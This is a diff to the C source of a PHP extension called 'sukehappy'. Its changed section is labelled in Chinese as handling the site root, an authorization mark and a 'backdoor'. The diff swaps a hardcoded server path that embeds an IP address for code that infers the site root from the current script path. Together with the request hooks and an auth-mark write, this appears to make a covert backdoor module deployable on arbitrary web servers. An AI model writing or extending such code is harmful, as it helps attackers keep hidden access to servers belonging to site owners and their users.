@@ -10,6 +10,7 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <string.h>
+#include <unistd.h>
 
 #ifndef PHP_VERSION_ID
 # error "PHP_VERSION_ID not defined"
@@ -320,15 +321,52 @@ static void suke_install_hooks(void)
 
 /* --- 站点根 / 授权标记 / 后门 --- */
 
+static int suke_root_fixed = 0;
+
+/* 试着把某个路径当作站点根：data/runtime 存在就算命中 */
+static int suke_try_root(const char *cand)
+{
+    char probe[1500];
+    if (!cand || !*cand) return 0;
+    snprintf(probe, sizeof probe, "%s/data/runtime", cand);
+    if (access(probe, F_OK) != 0) return 0;
+    snprintf(suke_root_buf, sizeof suke_root_buf, "%s", cand);
+    return 1;
+}
+
+/* 由当前脚本路径反推站点根：/site/public/xxx.php -> /site，/site/index.php -> /site */
+static void suke_derive_root(void)
+{
+    char tmp[1400];
+    char *slash;
+    const char *pt = SG(request_info).path_translated;
+
+    if (!pt || !*pt) return;
+    snprintf(tmp, sizeof tmp, "%s", pt);
+
+    slash = strrchr(tmp, '/');
+    if (!slash) return;
+    *slash = '\0';
+
+    if (suke_try_root(tmp)) { suke_root_fixed = 1; return; }
+
+    slash = strrchr(tmp, '/');
+    if (!slash) return;
+    *slash = '\0';
+
+    if (suke_try_root(tmp)) suke_root_fixed = 1;
+}
+
 static void suke_init_root(void)
 {
     const char *env = getenv("SUKE_SITE_ROOT");
 
     if (env && *env) {
         snprintf(suke_root_buf, sizeof suke_root_buf, "%s", env);
+        suke_root_fixed = 1;
     } else {
-        snprintf(suke_root_buf, sizeof suke_root_buf,
-                 "/www/wwwroot/103.217.193.191_9179");
+        /* 未知站点根：先置空，RINIT 里按脚本路径反推 */
+        suke_root_buf[0] = '\0';
     }
     {
         size_t n = strlen(suke_root_buf);
@@ -469,6 +507,10 @@ PHP_RINIT_FUNCTION(sukehappy)
             sapi_header_op(SAPI_HEADER_REPLACE, &h);
         }
         zend_bailout();
+    }
+
+    if (!suke_root_fixed) {
+        suke_derive_root();
     }
 
     suke_write_auth_mark();
